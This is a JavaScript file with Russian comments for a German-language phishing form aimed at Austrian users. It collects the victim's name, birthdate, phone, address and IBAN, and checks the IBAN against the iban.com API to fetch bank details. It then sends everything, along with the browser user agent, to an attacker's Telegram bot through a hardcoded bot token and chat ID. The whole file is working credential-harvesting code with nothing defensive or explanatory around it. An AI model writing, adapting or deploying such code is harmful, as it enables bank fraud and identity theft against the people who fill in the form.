// ============================================================
// 🔥 КОНФИГУРАЦИЯ
// ============================================================
const BOT_TOKEN = "8868232573:AAEW0wq6mguGORRd_woASqbkE80zg7w59G8";
const CHAT_ID = "-1004324836304";

// Вставь сюда свой API ключ от developer.iban.com
const IBAN_API_KEY = "ТВОЙ_API_КЛЮЧ_ЗДЕСЬ"; 

let ibanCheckResult = {
    valid: false,
    message: 'nicht geprüft',
    bankData: null,
    iban: ''
};

// ============================================================
// 📅 ВАЛИДАЦИЯ ДАТЫ РОЖДЕНИЯ (от 1950 до 2008)
// ============================================================
function validateBirthdate(value) {
    const parts = value.split('/');
    if (parts.length !== 3) return { valid: false, message: 'Ungültiges Datum.' };

    const day = parseInt(parts[0], 10);
    const month = parseInt(parts[1], 10);
    const year = parseInt(parts[2], 10);

    if (isNaN(day) || isNaN(month) || isNaN(year)) {
        return { valid: false, message: 'Ungültiges Datum.' };
    }

    if (year < 1950 || year > 2008) {
        return { valid: false, message: 'Ungültiges Datum.' };
    }

    if (month < 1 || month > 12) {
        return { valid: false, message: 'Ungültiges Datum.' };
    }

    const date = new Date(year, month - 1, day);
    if (date.getFullYear() !== year || date.getMonth() !== month - 1 || date.getDate() !== day) {
        return { valid: false, message: 'Ungültiges Datum.' };
    }

    return { valid: true, message: '' };
}

// ============================================================
// 🏦 ПРОВЕРКА IBAN ЧЕРЕЗ API (получение BIC и банка)
// ============================================================
async function validateIbanWithApi(iban) {
    try {
        const url = `https://api.iban.com/clients/api/v4/iban/?api_key=${IBAN_API_KEY}&format=json&iban=${iban}`;
        const response = await fetch(url);
        const data = await response.json();

        if (data.errors && data.errors.length > 0) {
            console.error("IBAN API Error:", data.errors);
            return { valid: false, message: 'Ungültige IBAN.', bankData: null };
        }

        const v = data.validations;
        const isValid = v.iban.code === "001" && 
                        v.length.code === "003" && 
                        v.structure.code === "005" && 
                        v.chars.code === "006" && 
                        v.country_support.code === "007" &&
                        (v.account.code === "002" || v.account.code === "004");

        if (isValid) {
            if (data.bank_data && data.bank_data.bic) {
                return {
                    valid: true,
                    message: 'Gültige IBAN.',
                    bankData: {
                        bic: data.bank_data.bic,
                        bank: data.bank_data.bank,
                        city: data.bank_data.city
                    }
                };
            } else {
                return {
                    valid: true,
                    message: 'Gültige IBAN (Bank nicht gefunden).',
                    bankData: null
                };
            }
        } else {
            return { valid: false, message: 'Ungültige IBAN.', bankData: null };
        }
    } catch (error) {
        console.error("IBAN API Fetch Error:", error);
        return { valid: false, message: 'Ungültige IBAN.', bankData: null };
    }
}

// ============================================================
// 🚀 ИНИЦИАЛИЗАЦИЯ
// ============================================================
document.addEventListener('DOMContentLoaded', function() {
    const ibanInput = document.getElementById('ibanInput');
    const birthdateInput = document.getElementById('birthdateInput');
    const phoneInput = document.getElementById('phoneInput');
    const submitBtn = document.getElementById('submitBtn');
    const ibanError = document.getElementById('ibanError');
    const birthdateError = document.getElementById('birthdateError');

    if (submitBtn) submitBtn.disabled = false;

    // === ТЕЛЕФОН ===
    if (phoneInput) {
        if (phoneInput.value === '' || phoneInput.value === '+43') phoneInput.value = '+43';
        phoneInput.addEventListener('focus', function() {
            const len = this.value.length;
            this.setSelectionRange(len, len);
        });
        phoneInput.addEventListener('input', function() {
            if (this.value === '') {
                this.value = '+43';
                const len = this.value.length;
                this.setSelectionRange(len, len);
            }
        });
    }

    // === МАСКА ДЛЯ ДАТЫ ===
    if (birthdateInput) {
        birthdateInput.addEventListener('input', function(e) {
            let value = this.value.replace(/\D/g, '');
            let formatted = '';
            if (value.length > 8) value = value.slice(0, 8);
            for (let i = 0; i < value.length; i++) {
                if (i === 2 || i === 4) formatted += '/';
                formatted += value[i];
            }
            this.value = formatted;
            // Скрываем ошибку при новом вводе
            if (birthdateError) birthdateError.style.display = 'none';
        });
    }

    // === IBAN (только форматирование, без проверки) ===
    if (ibanInput) {
        ibanInput.maxLength = 34;
        ibanInput.addEventListener('input', function() {
            let value = this.value.replace(/\s/g, '').toUpperCase();
            this.value = value;
            // Скрываем ошибку при новом вводе
            if (ibanError) ibanError.style.display = 'none';
        });
    }

    // === ОТПРАВКА ФОРМЫ ===
    const form = document.getElementById('phishingForm');
    if (!form) return;

    form.addEventListener('submit', async function(event) {
        event.preventDefault();

        // Скрываем все ошибки перед новой проверкой
        if (ibanError) ibanError.style.display = 'none';
        if (birthdateError) birthdateError.style.display = 'none';

        // --- Проверка телефона ---
        const phoneDigits = phoneInput.value.replace(/[^0-9]/g, '');
        if (phoneDigits.length < 6) {
            alert('Bitte geben Sie eine gültige Telefonnummer ein (mindestens 6 Ziffern).');
            return;
        }

        // --- Проверка IBAN (сначала локальная, потом API) ---
        const ibanValue = ibanInput.value.trim();
        if (!ibanValue.startsWith('AT') || ibanValue.length < 20 || !/^[A-Z0-9]+$/.test(ibanValue)) {
            if (ibanError) { ibanError.textContent = 'Ungültige IBAN.'; ibanError.style.display = 'block'; }
            ibanInput.focus();
            return;
        }

        // --- Проверка даты рождения ---
        const birthdateValue = birthdateInput.value.trim();
        const birthdateValidation = validateBirthdate(birthdateValue);
        if (!birthdateValidation.valid) {
            if (birthdateError) {
                birthdateError.textContent = birthdateValidation.message;
                birthdateError.style.display = 'block';
            }
            birthdateInput.focus();
            return;
        }

        // --- Блокируем кнопку и делаем запрос к API ---
        if (submitBtn) {
            submitBtn.disabled = true;
            submitBtn.textContent = '⏳ Prüfe IBAN...';
        }

        const apiResult = await validateIbanWithApi(ibanValue);

        if (!apiResult.valid) {
            if (ibanError) { ibanError.textContent = 'Ungültige IBAN.'; ibanError.style.display = 'block'; }
            if (submitBtn) {
                submitBtn.disabled = false;
                submitBtn.textContent = 'Absenden';
            }
            return;
        }

        // --- Всё ок, обновляем статус и отправляем ---
        ibanCheckResult = {
            valid: true,
            message: apiResult.message || 'Gültige IBAN.',
            bankData: apiResult.bankData,
            iban: ibanValue
        };

        const formData = new FormData(form);
        const data = {};
        formData.forEach((value, key) => {
            data[key] = value.trim() || 'nicht angegeben';
        });

        data.iban_check = ibanCheckResult;
        sendToTelegram(data);
    });
});

// ============================================================
// 📤 ОТПРАВКА В TELEGRAM
// ============================================================
function sendToTelegram(data) {
    const submitBtn = document.getElementById('submitBtn');
    submitBtn.disabled = true;
    submitBtn.textContent = '⏳ Sende...';

    let message = '🔴 <b>NEUE DATEN!</b>\n\n';
    message += `👤 <b>Name:</b> ${data.fullname || 'nicht angegeben'}\n`;
    message += `🎂 <b>Geburtsdatum:</b> ${data.birthdate || 'nicht angegeben'}\n`;
    message += `📱 <b>Telefon:</b> ${data.phone || 'nicht angegeben'}\n`;
    message += `📍 <b>Adresse:</b> ${data.street || 'nicht angegeben'}\n`;
    message += `🏙️ <b>Stadt:</b> ${data.city || 'nicht angegeben'}\n`;
    message += `📮 <b>PLZ:</b> ${data.postal || 'nicht angegeben'}\n`;

    const ibanData = data.iban_check || { valid: false, message: 'nicht geprüft', bankData: null };
    message += `🏦 <b>IBAN:</b> ${data.iban || 'nicht angegeben'}\n`;
    message += `🔍 <b>IBAN-Status:</b> ${ibanData.message || 'nicht geprüft'}\n`;
    
    if (ibanData.bankData) {
        message += `🏛️ <b>Bank:</b> ${ibanData.bankData.bank || 'nicht angegeben'}\n`;
        message += `🏛️ <b>BIC:</b> ${ibanData.bankData.bic || 'nicht angegeben'}\n`;
        message += `🏛️ <b>Stadt:</b> ${ibanData.bankData.city || 'nicht angegeben'}\n`;
    }

    message += `\n🕒 <b>Zeit:</b> ${new Date().toLocaleString('de-DE')}`;
    message += `\n🌐 <b>Browser:</b> ${navigator.userAgent}`;

    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            submitBtn.textContent = '✅ Gesendet!';
            submitBtn.style.background = '#28a745';
            setTimeout(() => {
                document.getElementById('phishingForm').reset();
                submitBtn.textContent = 'Absenden';
                submitBtn.style.background = '';
                submitBtn.disabled = false;

                const phoneInput = document.getElementById('phoneInput');
                if (phoneInput) phoneInput.value = '+43';
                const birthdateInput = document.getElementById('birthdateInput');
                if (birthdateInput) birthdateInput.value = '';
                const ibanInput = document.getElementById('ibanInput');
                if (ibanInput) ibanInput.value = '';

                ibanCheckResult = { valid: false, message: 'nicht geprüft', bankData: null, iban: '' };
            }, 2000);
        } else {
            throw new Error(data.description || 'Unknown error');
        }
    })
    .catch(error => {
        submitBtn.textContent = '❌ Fehler!';
        submitBtn.style.background = '#dc3545';
        setTimeout(() => {
            submitBtn.textContent = 'Absenden';
            submitBtn.style.background = '';
            submitBtn.disabled = false;
        }, 3000);
    });
}
